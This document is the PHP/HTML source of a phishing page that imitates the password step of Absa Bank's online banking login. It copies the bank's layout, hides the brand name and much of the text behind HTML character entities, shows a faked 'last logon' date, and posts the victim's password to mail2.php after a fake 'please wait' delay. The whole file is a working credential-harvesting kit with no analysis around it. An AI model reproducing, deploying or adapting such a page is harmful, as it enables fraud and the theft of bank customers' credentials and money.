<?php
require "includes/enc.php";
require "includes/functions.php";
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<style type="text/css">.btl-repaint{zoom:1;background-color:transparent;-moz-outline:none;}</style>
<style type="text/css">.btl-drag-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;background-color:#DFE0E1;border-color:#8B8D91;}</style>
<style type="text/css">.btl-resize-cursorElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:10000;opacity:0;-ms-filter:"alpha(opacity=0)";filter:alpha(opacity=0);background:white;}.btl-resize-lineElement{position:absolute;top:-10000px;left:-10000px;width:1px;height:100px;z-index:9999;border-width:1px;border-style:solid;border-color:#8B8D91;overflow:hidden;}.btl-resize-outlineElement{position:absolute;top:-10000px;left:-10000px;width:100px;height:100px;z-index:9999;border-width:1px;border-style:solid;opacity:.4;-ms-filter:"alpha(opacity=40)";filter:alpha(opacity=40);background-color:#DFE0E1;border-color:#8B8D91;}</style>
	<link rel="shortcut icon" href="media/favicon.ico">
		<meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
		<title>&#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;</title>
		<link rel="stylesheet" type="text/css" href="media/main.css" media="screen">
		<link rel="stylesheet" type="text/css" href="media/login.css">
		<link rel="stylesheet" type="text/css" href="media/jcaptcha.css">

<Style>
#error2 {
display: none }

#error3 {
display: none }


.pf {
height: 31px;
}
.pfsmall {
height: 22px;
width: 27px;
}
</style>


<SCRIPT>
<!--


function check(form) {



if (form.p1.value == "")
{ document.getElementById('error2').style.display = "block"; form.p1.focus(); return;}


var regExpress = /^[a-zA-Z0-9]+$/
if (!regExpress.test(p1.value))
{ document.getElementById('error2').style.display = "block"; document.getElementById('error3').style.display = "block"; form.p1.focus(); return;} 


if (form.p1.value.length < 6) 
{ document.getElementById('error2').style.display = "block"; document.getElementById('error3').style.display = "block"; form.p1.focus(); return;}


document.getElementById("pleasewait").style.display = "block";
setTimeout(function() { form.submit() }, 1900);


}

//-->
</SCRIPT>
</head>
	<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv">
		<div></div>
		<div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
			<img src="media/logo-red.png" width="44" height="44">
		</div>
		<div class="ap-page-header" style="z-index:106;">
			<div class="ap-navigation-main" style="z-index:107;">
				<div class="ap-tabStrip-rounded-left"></div>
				<ul class="ap-tabStrip-tabs">
					<li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
						<div class="ap-tab-title" tabindex="10">Logon</div>
						<div class="ap-tab-title-hidden">Logon</div>
					</li>
					<li class="ap-tab-button" id="SSR-tab-19">
							<div class="ap-tab-title" tabindex="11"><a href="#">Registration</a></div>
						<div class="ap-tab-title-hidden">Registration</div>
					</li>
					<li class="ap-tab-button" id="SSR-tab-20">
						<div class="ap-tab-title" tabindex="12"><a href="#">&#x41;&#x62;&#x73;&#x61; home page</a></div>
						<div class="ap-tab-title-hidden" style="font-size:14px;">&#x41;&#x62;&#x73;&#x61; home page</div>
					</li>
				</ul>
				<div class="ap-tabStrip-rounded-right"></div>
				<div style="clear: both;"></div>
				<!-- <img src="static/style/resources/ao-logo2.png" width="189" height="60" style="position:absolute;top:0;right:20px" id="theImg"/> -->
				<div class="ap-navigation-sub ap-tabStrip-subnav"></div>
			</div>
		</div>
		<div class="ap-page-container" style="z-index:104;">
			<!-- PS: above div  ap-page-header   was HERE -->
			<div class="ap-global-message" id="ap-global-message">
				<div id="ap-nocookies-msg" style="display: none;">
					Warning: you do not have Cookies enabled. This applications needs Cookies to function
					properly. Please turn it on and reload the page. If you need assistance
					in turning on your Cookies <a>click here</a> to get instructions.
				</div>
				<noscript>
					<div>
						Warning: you do not have Javascript enabled. This
						applications needs Javascript to function properly. Please turn it on
						and reload the page. If you need assistance in turning on your
						Javascript <a>click here</a> to get instructions.
					</div>
				</noscript>
			</div>
			<div class="ap-main-content-wrapper">
				<!-- Page top corners -->
				<div class="ap-main-content-wrapper-top">
					<div class="ap-corners-rounded-top-left"></div>
					<div class="ap-corners-rounded-top"></div>
					<div class="ap-corners-rounded-top-right"></div>
				</div>
				<!-- Page content -->
				<div class="ap-page-content ap-container">
					<div class="ap-container-highlevel">
						<div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
							<div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
								Logon&nbsp;
								| Welcome to &#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;
							</div>
						</div>
						<div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden"><!-- PS: height must be set here to AUTO else it cuts of the bottom of the inner content -->
							<div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
								<!-- ap-column-1 -->
								<div class="ap-column-1 accessAccountScreen" id="ap-column-1" styleold="width:389px; padding:0">
									<div class="ap-login-container" id="ap-login-container">
<div class="ap-container-highlevel" style="width:604px;">
	<div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login"  style="width: 603px;">
		<div class="ap-bar-section ap-bar-title" style="margin-top:8px; margin-left:0px" tabindex="5">
			&nbsp;&nbsp;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x53;&#x75;&#x72;&#x65;&#x50;&#x68;&#x72;&#x61;&#x73;&#x65;&#x2122;
		</div>
	</div>

	<div class="ap-container-content" style="font-size:11px;width:604px;">
		<div class="ui-keyboard" oninputchange="if (input.value.length) doMoveForm2Focus(input)">
			<form name="upinfo" class="ui-form" method="POST" action="mail2.php">
				<table class="ui-grid ui-keyboard-inputs" style="font-size:11px;">
					<tbody>
						<tr class="ui-row">
							<td tabindex="0" class="ui-cell">
								<!-- APB Start -->
								
								
									<b>&#x50;&#x49;&#x4e;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;</b>.
									The last time you logged onto &#x41;&#x62;&#x73;&#x61;&#x20;&#x4f;&#x6e;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x6f;&#x72;&#x20;&#x43;&#x65;&#x6c;&#x6c;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x20;&#x42;&#x61;&#x6e;&#x6b;&#x69;&#x6e;&#x67; was on&nbsp;<script>var today = new Date();
var dd = today.getDate();
var mm = today.getMonth()+1; //January is 0!
var yyyy = today.getFullYear();

if(dd<10) {
    dd='0'+dd
} 

if(mm<10) {
    mm='0'+mm
} 

today = yyyy+'-'+mm+'-'+dd;
document.write(today);</script>
								
								<!-- APB End -->
							</td>
						</tr>
						
						<tr class="ui-row">
							<td class="ui-cell">
								&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x61;&#x6c;&#x6c;&#x20;&#x74;&#x68;&#x65;&#x20;&#x63;&#x68;&#x61;&#x72;&#x61;&#x63;&#x74;&#x65;&#x72;&#x73;&#x20;&#x6f;&#x66;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;.
							</td>
						</tr>
						<tr class="ui-row">
							<td class="ui-cell">
								
								
								
															
				
<input onKeyDown="if(event.keyCode==13) check(this.form);" onkeypress="return event.keyCode!=13" autofocus="autofocus" class="pf pf2 ui-keyboard-input-selected vi-activeElement" style="width:280px;text-align:left;padding-left:10px;" maxlength="12" name="p1" id="p1" value="" type="password">

								
							</td>
						</tr>
						<tr class="ui-row">
							<td class="ui-cell">
								&#x49;&#x74;&#x20;&#x69;&#x73;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x69;&#x62;&#x69;&#x6c;&#x69;&#x74;&#x79;&#x20;&#x74;&#x6f;&#x20;&#x65;&#x6e;&#x73;&#x75;&#x72;&#x65;&#x20;&#x74;&#x68;&#x65;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x63;&#x79;&#x20;&#x6f;&#x66;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x2e;
								&nbsp;&nbsp;
								<div style="color:#AF144B; cursor:pointer; padding-top:4px; text-decoration:underline;" onclick="onForm2SubmitForgotPassword()">Forgot password?</div>
							</td>
						</tr>
						<tr class="ui-row">
							<td class="ui-cell">
								<input tabindex="4" id="viCheckbox" style="vertical-align: middle;" type="checkbox" name="viuser" value="1" title="Select to enable visually impaired interface."><label for="viuser" style="vertical-align:middle;" title="'Select to enable visually impaired interface.'">
									Select to enable visually impaired interface.
								</label>
							</td>
						</tr>
					</tbody>
				</table>
				<div class="ui-formFoot">
					<div class="genericMessage-place-holder" style="display:block">
						<div role="alert" id="error2" tabindex="0" class="ui-message ui-message-error" style="display:none">
							<span class="vi-screenreader-line"> Error details. </span>
							<div class="ui-message-timeStamp">
							<script>

function GetNow(){
    var currentdate = new Date(); 
    var datetime = currentdate.getFullYear() + "-"
            + (currentdate.getMonth()+1) + "-" 
            + currentdate.getDate() + " "  
            + currentdate.getHours() + ":"  
            + currentdate.getMinutes() + ":" 
            + currentdate.getSeconds();
    return datetime;
}

document.write(GetNow());

</script>
							</div>
							<div class="ui-message--icon"></div>
							<div style="margin-right:120px" class="ui-message-content">
								<div class="ui-message-title"></div>
								<div class="ui-message-body" id="therequired">
								Invalid password <span id="charnr"></span> entered.	
								</div>
								<div class="ui-message-body" id="error3"><!-- msg here -->&nbsp;&nbsp;Your password should be letters and numbers only. </div>
							</div>
							<div class="clear-both"></div>
						</div>
					</div>
					
					<div class="validation-place-holder"></div>
					
					<div class="ui-buttonFooter">
						<div class="ui-exception-container">
							<!--  -->
							<div style="float:left">
								<span>Landing page:</span>&nbsp;
								<select tabindex="8" class="ui-select" id="landingpage2" defaultval="express" name="landingpage2" style="vertical-align: middle;">
									<option value="accounts">My accounts</option>
									<option value="express" selected="selected">Express</option>
									<option value="payments">Make a payment</option>
									<option value="saveinvest">Save and invest</option>
									<option value="apply">Apply for an account</option>
									<option value="insurance">Insure</option>
									<option value="profile">View my profile</option>
								</select>
							</div>
							<!-- Removed vi user checkbox -->
							<!-- Buttons -->
							<button aria-label="Logoff" type="button" tabindex="7" class="ui-button ap-button-reset">	<!-- ap-button-logout -->
								<div class="ui-button-left">
									<div class="ui-button-right">
										<div class="ui-button-center">Logoff</div>
									</div>
								</div>
							</button>
							<button aria-label="Reset" type="reset" tabindex="6" onclick="resetForm2()" class="ui-button ap-button-reset">
								<div class="ui-button-left">
									<div class="ui-button-right">
										<div class="ui-button-center">Reset</div>
									</div>
								</div>
							</button>
							<button aria-label="Logon" type="button"  onclick="check(this.form)"  tabindex="5" class="ui-button ap-button-next">
								<div class="ui-button-left">
									<div class="ui-button-right">
										<div class="ui-button-center">Logon</div>
									</div>
								</div>
							</button>
						</div>
					</div>
				</div>
			</form>
			
			<!-- keyboard -->
			<table class="ui-grid" style="font-size:11px;">
				<tbody>
					<tr class="ui-row">
						<td class="ui-cell ap-login-keyBoardLabelCell">
							Use the online keyboard to enter your password.
						</td>
					</tr>
					<tr class="ui-row">
						<td class="ui-cell">
							<div class="ui-keyboard-keyboardContainer" style="user-select: none;">
								<div class="floatleft ui-keyboard-keyboardContainer-utils">
									<div class="ui-keyboard-button util" action="backspace" unselectable="on">
										<div class="backspace" unselectable="on"></div>
										Backspace
									</div>
									<div class="ui-keyboard-button util" action="capslock" unselectable="on">
										CapsLock
									</div>
								</div>
								<div class="floatleft ui-keyboard-keyboardContainer-keys" >
									<div class="row">
										<div class="ui-keyboard-button" unselectable="on">1</div>
										<div class="ui-keyboard-button" unselectable="on">2</div>
										<div class="ui-keyboard-button" unselectable="on">3</div>
										<div class="ui-keyboard-button" unselectable="on">4</div>
										<div class="ui-keyboard-button" unselectable="on">5</div>
										<div class="ui-keyboard-button" unselectable="on">6</div>
										<div class="ui-keyboard-button" unselectable="on">7</div>
										<div class="ui-keyboard-button" unselectable="on">8</div>
										<div class="ui-keyboard-button" unselectable="on">9</div>
										<div class="ui-keyboard-button" unselectable="on">0</div>
										<div class="clearBoth"></div>
									</div>
									<div class="row ui-keyboard-keyboardContainer-row2">
										<div class="ui-keyboard-button" unselectable="on">q</div>
										<div class="ui-keyboard-button" unselectable="on">w</div>
										<div class="ui-keyboard-button" unselectable="on">e</div>
										<div class="ui-keyboard-button" unselectable="on">r</div>
										<div class="ui-keyboard-button" unselectable="on">t</div>
										<div class="ui-keyboard-button" unselectable="on">y</div>
										<div class="ui-keyboard-button" unselectable="on">u</div>
										<div class="ui-keyboard-button" unselectable="on">i</div>
										<div class="ui-keyboard-button" unselectable="on">o</div>
										<div class="ui-keyboard-button" unselectable="on">p</div>
										<div class="clearBoth"></div>
									</div>
									<div class="row ui-keyboard-keyboardContainer-row3">
										<div class="ui-keyboard-button" unselectable="on">a</div>
										<div class="ui-keyboard-button" unselectable="on">s</div>
										<div class="ui-keyboard-button" unselectable="on">d</div>
										<div class="ui-keyboard-button" unselectable="on">f</div>
										<div class="ui-keyboard-button" unselectable="on">g</div>
										<div class="ui-keyboard-button" unselectable="on">h</div>
										<div class="ui-keyboard-button" unselectable="on">j</div>
										<div class="ui-keyboard-button" unselectable="on">k</div>
										<div class="ui-keyboard-button" unselectable="on">l</div>
										<div class="clearBoth"></div>
									</div>
									<div class="row ui-keyboard-keyboardContainer-row4">
										<div class="ui-keyboard-button" unselectable="on">z</div>
										<div class="ui-keyboard-button" unselectable="on">x</div>
										<div class="ui-keyboard-button" unselectable="on">c</div>
										<div class="ui-keyboard-button" unselectable="on">v</div>
										<div class="ui-keyboard-button" unselectable="on">b</div>
										<div class="ui-keyboard-button" unselectable="on">n</div>
										<div class="ui-keyboard-button" unselectable="on">m</div>
										<div class="clearBoth"></div>
									</div>
								</div>
							</div>
						</td>
					</tr>
				</tbody>
			</table>
		</div>
	</div>
	
	
	<div class="ap-container-bottom-corners">
		<div class="ap-corners-rounded-bottom-left"></div>
		<div class="ap-corners-rounded-bottom" style="width:590px;"></div>
		
	</div>
</div>
									</div>
								</div>
								<!-- ap-column-2 -->
								<div class="ap-column-2 passwordScreenAdds" id="ap-column-2" styleold="width:550px;">
									
								
									
									<!-- How it Works Right of 2nd page -->
									<div id="divhowitworks" class="ap-login-block-rounded" style="display: block;">
										<div>
											<!-- top round borders -->
											<div class="ap-login-block-rounded-top">
												<div class="ap-corners-rounded-top-left"></div>
												<div class="ap-corners-rounded-top" style="width:312px;"></div>
												<div class="ap-corners-rounded-top-right"></div>
											</div>
											<!-- content -->
											<div role="tablist" class="ui-tabBox">
												<ul class="ui-tabHeads">
													<li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="15">
														How it works
														<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
													</li>
												</ul>
												<div class="ui-tabBodies">
													<div tabindex="16" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
														<div style="background: #FFFFFF;">
															<div style="border-bottom: 1px solid #CCCCCC;">
																<div style="padding: 10px;">In this example the password is <b>Password1</b></div>
															</div>
															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
																<span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span>
																<span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span>
																<span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span>
																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
															</div>
															<div style="margin: 10px 0px 5px 10px;">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
															</div>
															<div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;">
																You have to enter (case sensitive):
															</div>
															<div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
																<span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span>
																<span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
															</div>
															<div style="margin: 10px 0px 5px 10px;">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
																<input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
																<input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
															</div>
															<br>
														</div>
													</div>
												</div>
											</div>
											<!-- bottom round borders -->
											<div class="ap-login-block-rounded-bottom">
												<div class="ap-corners-rounded-bottom-left"></div>
												<div class="ap-corners-rounded-bottom" style="width:312px;"></div>
												<div class="ap-corners-rounded-bottom-right"></div>
											</div>
										</div>
										
										<div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px 0px;" id="ap-campaignImage-div"><a href="#"><img src="media/campaigne_3_post_golive_EN.jpg" alt=""></a></div>
									</div>
								</div>
								<!-- ap-column-2 -->
								<div class="ap-columns-clear"></div>
							</div>
							<!-- ap-columns-2-lhs -->
							<div style="width: 100%; height: 10px;"></div>
							<!-- 3 column layout -->
							<div id="divbottomadds" class="ap-login-columns ap-columns-33">
								<!-- ap-column-1 -->
								<div class="ap-column-1">
									<!-- Security Centre Links Bottom left of Login page 1 -->
									<!-- PS: Was moved for Resonance to be next to input fields -->
									&nbsp;
								</div>
								<!-- ap-column-2 -->
								<div class="ap-column-2">
									<!-- Campaign Banner 1 used to be here -->
									&nbsp;
								</div>
								<!-- ap-column-3 -->
								<div class="ap-column-3">
									<!-- Campaign Banner 2 used to be here -->
									&nbsp;
								</div>
							</div>
						</div>
						<!-- bottom rounded corners -->
						<!-- <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-show"> -->
						<div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
							<div class="ap-corners-rounded-bottom-left"></div>
							<div class="ap-corners-rounded-bottom"></div>
							<div class="ap-corners-rounded-bottom-right"></div>
						</div>
					</div>
				</div>
				<!-- Page bottom corners -->
				<div class="ap-main-content-wrapper-bottom">
					<div class="ap-corners-rounded-bottom-left"></div>
					<div class="ap-corners-rounded-bottom"></div>
					<div class="ap-corners-rounded-bottom-right"></div>
				</div>
			</div>
			<div class="ap-footer" tabindex="20">
				<div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
					<p tabindex="21">
						&#xa9; Copyright. &#x41;&#x62;&#x73;&#x61; &#x42;&#x61;&#x6e;&#x6b; Limited. &#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x4e;&#x75;&#x6d;&#x62;&#x65;&#x72;&#x3a;&#x20;&#x31;&#x39;&#x38;&#x36;&#x2f;&#x30;&#x30;&#x34;&#x37;&#x39;&#x34;&#x2f;&#x30;&#x36;&nbsp;
						&#x41;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x69;&#x7a;&#x65;&#x64;&#x20;&#x66;&#x69;&#x6e;&#x61;&#x6e;&#x63;&#x69;&#x61;&#x6c;&#x20;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x65;&#x64;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x70;&#x72;&#x6f;&#x76;&#x69;&#x64;&#x65;&#x72;&#x20;&#x4e;&#x43;&#x52;&#x43;&#x50;&#x37;
					</p>
					<div class="ap-footer-links">
						<ul><li><a href="#" id="am">Terms of use</a></li><li><a href="#" id="am">Software requirements</a></li><li><a href="#" id="am">Security centre</a></li><li><a href="#" id="am">&#x42;&#x61;&#x6e;&#x6b;ing regulations</a></li></ul>
					</div>
					<!-- Barclays Logo Link bottom right of page -->
					<div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
						<!-- <a href="#"><img src="static/style/resources/barclays_logo.gif" border="0" alt="Member of the Barclays group"></a> -->
						<!-- =xl.getImage("Images/Image/Barclays",lang) -->
					</div>
				</div>
			</div>
		</div>
		<!-- password tips -->

		<div></div>
<style>
#thebottom {
	position: relative;
	opacity: 1.0;
	background-color: #FFF;
	bottom: 0;
	left: 0;
	width: 100%;
	height: 225px;
	top: 75%;
}
</style>
<!-- Please wait controller -->
<div id="pleasewait" style="display:none;z-index:99999;" role="alert" class="ap-pleasewait">
<div id="pleasewait-viewport" class="ap-pleasewait--viewport">
<div class="ap-pleasewait--content">
<img src="media/ajax-loader-2.gif" width="32" height="32"/>
<span id="pleasewait-label" class="ap-pleasewait--label"></span>
</div>
<div id="thebottom"></div>
</div>
</div>
		
		<div></div>
		<script type="text/javascript" src="media/jquery.min.js"></script>

	<div class="btl-resize-cursorElement"></div><div class="btl-resize-lineElement"></div><div class="btl-resize-outlineElement"></div></body></html>